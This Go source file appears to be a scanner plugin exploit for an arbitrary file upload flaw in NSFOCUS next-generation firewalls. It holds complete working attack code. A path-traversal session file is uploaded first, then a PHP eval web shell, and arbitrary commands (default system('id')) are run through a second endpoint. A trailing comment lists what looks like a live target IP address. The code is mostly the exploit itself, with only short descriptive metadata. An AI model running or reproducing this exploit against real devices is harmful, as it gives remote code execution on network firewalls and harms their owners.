package exploits

import (
  "fmt"
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "net/url"
  "strings"
  "time"
)

func init() {
  expJson := `{
      "Name": "nsfocus resourse.php arbitrary file upload vulnerability",
      "Description": "<p>NSFOCUS Next Generation Firewall is a dedicated security firewall device.<br></p><p>There is an arbitrary file upload vulnerability in the NSFOCUS next-generation firewall bugsInfo/resourse.php file. An attacker can upload a malicious Trojan to gain server permissions.<br></p>",
      "Product": "nsfocus",
  "Homepage": "https://www.nsfocus.com.cn/",
  "DisclosureDate": "2022-07-18",
  "Author": "LittleBlack",
  "FofaQuery": "banner=\"PHPSESSID_NF\" || header=\"PHPSESSID_NF\"",
  "GobyQuery": "banner=\"PHPSESSID_NF\" || header=\"PHPSESSID_NF\"",
  "Level": "3",
      "Impact": "<p>There is an arbitrary file upload vulnerability in the NSFOCUS next-generation firewall bugsInfo/resourse.php file. An attacker can upload a malicious Trojan to gain server permissions.<br></p>",
      "Recommendation": "<p>1. Block 8081 port access. 2. Pay attention to the update of the official website in time: <a href=\"https://www.nsfocus.com.cn/\">https://www.nsfocus.com.cn/</a><br></p>",
  "References": [
    "https://fofa.so/"
  ],
  "Is0day": false,
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "system('id');",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
   "VulType": [
        "Code Execution"
      ],
      "Tags": [
        "Code Execution"
      ],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "9.5",
  "Translation": {
    "CN": {
      "Name": "绿盟下一代防火墙 resourse.php 任意文件上传漏洞",
      "Product": "绿盟下一代防火墙",
      "Description": "<p>绿盟下一代防火墙是一款专用安全防火墙设备。<br></p><p>绿盟下一代防火墙 bugsInfo/resourse.php 文件存在任意文件上传漏洞，攻击者可上传恶意木马，获取服务器权限。<br></p>",
      "Recommendation": "<p>1、阻拦8081端口访问。2、及时关注官网更新：<a href=\"https://www.nsfocus.com.cn/\">https://www.nsfocus.com.cn/</a><br></p>",
      "Impact": "<p>绿盟下一代防火墙 bugsInfo/resourse.php 文件存在任意文件上传漏洞，攻击者可上传恶意木马，获取服务器权限。<br></p>",
      "VulType": [
        "代码执⾏"
      ],
      "Tags": [
        "代码执⾏"
      ]
    },
    "EN": {
      "Name": "nsfocus resourse.php 任意文件上传漏洞",
      "Product": "nsfocus",
      "Description": "<p>NSFOCUS Next Generation Firewall is a dedicated security firewall device.<br></p><p>There is an arbitrary file upload vulnerability in the NSFOCUS next-generation firewall bugsInfo/resourse.php file. An attacker can upload a malicious Trojan to gain server permissions.<br></p>",
      "Recommendation": "<p>1. Block 8081 port access. 2. Pay attention to the update of the official website in time: <a href=\"https://www.nsfocus.com.cn/\">https://www.nsfocus.com.cn/</a><br></p>",
      "Impact": "<p>There is an arbitrary file upload vulnerability in the NSFOCUS next-generation firewall bugsInfo/resourse.php file. An attacker can upload a malicious Trojan to gain server permissions.<br></p>",
      "VulType": [
        "Code Execution"
      ],
      "Tags": [
        "Code Execution"
      ]
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

      u1 := httpclient.NewFixUrl("https://" + u.IP + ":8081")
      uri1 := "/api/v1/device/bugsInfo"
      cfg1 := httpclient.NewPostRequestConfig(uri1)
      cfg1.VerifyTls = false
      cfg1.FollowRedirect = false
      cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9")
      cfg1.Data = "--1d52ba2a11ad8a915eddab1a0e85acd9\r\nContent-Disposition: form-data; name=\"file\"; filename=\"sess_82c13f359d0dd8f51c29d658a9c8ac71\"\r\n\r\nlang|s:52:\"../../../../../../../../../../../../../../../../tmp/\";\r\n--1d52ba2a11ad8a915eddab1a0e85acd9--\r\n"
      if resp, err := httpclient.DoHttpRequest(u1, cfg1); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "upload file success") {
        time.Sleep(time.Second * 5)
        uri2 := "/api/v1/device/bugsInfo"
        cfg2 := httpclient.NewPostRequestConfig(uri2)
        cfg2.VerifyTls = false
        cfg2.FollowRedirect = false
        cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef")
        cfg2.Data = "--4803b59d015026999b45993b1245f0ef\r\nContent-Disposition: form-data; name=\"file\"; filename=\"compose.php\"\r\n\r\n<?php eval($_POST[1]);?>\r\n--4803b59d015026999b45993b1245f0ef--\r\n"
        if resp2, err2 := httpclient.DoHttpRequest(u1, cfg2); err2 == nil && resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "upload file success") {
          u3 := httpclient.NewFixUrl("https://" + u.IP + ":4433")
          uri3 := "/mail/include/header_main.php"
          cfg3 := httpclient.NewPostRequestConfig(uri3)
          cfg3.VerifyTls = false
          cfg3.FollowRedirect = false
          cfg3.Header.Store("Cookie", "PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71")
          cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
          cfg3.Data = "1=print+md5%281%29%3B"
          if resp3, err := httpclient.DoHttpRequest(u3, cfg3); err == nil {
            return resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "c4ca4238a0b923820dcc509a6f75849b")
          }

        }
      }

      return false
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      cmd := ss.Params["cmd"].(string)

      u1 := httpclient.NewFixUrl("https://" + expResult.HostInfo.IP + ":8081")
      uri1 := "/api/v1/device/bugsInfo"
      cfg1 := httpclient.NewPostRequestConfig(uri1)
      cfg1.VerifyTls = false
      cfg1.FollowRedirect = false
      cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9")
      cfg1.Data = "--1d52ba2a11ad8a915eddab1a0e85acd9\r\nContent-Disposition: form-data; name=\"file\"; filename=\"sess_82c13f359d0dd8f51c29d658a9c8ac71\"\r\n\r\nlang|s:52:\"../../../../../../../../../../../../../../../../tmp/\";\r\n--1d52ba2a11ad8a915eddab1a0e85acd9--\r\n"
      if resp, err := httpclient.DoHttpRequest(u1, cfg1); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "upload file success") {
        time.Sleep(time.Second * 5)
        uri2 := "/api/v1/device/bugsInfo"
        cfg2 := httpclient.NewPostRequestConfig(uri2)
        cfg2.VerifyTls = false
        cfg2.FollowRedirect = false
        cfg2.Header.Store("Content-Type", "multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef")
        cfg2.Data = "--4803b59d015026999b45993b1245f0ef\r\nContent-Disposition: form-data; name=\"file\"; filename=\"compose.php\"\r\n\r\n<?php eval($_POST[1]);?>\r\n--4803b59d015026999b45993b1245f0ef--\r\n"
        if resp2, err2 := httpclient.DoHttpRequest(u1, cfg2); err2 == nil && resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "upload file success") {
          u3 := httpclient.NewFixUrl("https://" + expResult.HostInfo.IP + ":4433")
          uri3 := "/mail/include/header_main.php"
          cfg3 := httpclient.NewPostRequestConfig(uri3)
          cfg3.VerifyTls = false
          cfg3.FollowRedirect = false
          cfg3.Header.Store("Cookie", "PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71")
          cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
          cfg3.Data = fmt.Sprintf("1=%s", url.QueryEscape(cmd))
          if resp3, err := httpclient.DoHttpRequest(u3, cfg3); err == nil && resp3.StatusCode == 200 {
            expResult.Output = resp3.RawBody
            expResult.Success = true
          }

        }
      }
      return expResult
    },
  ))
}

//https://222.75.146.134:4433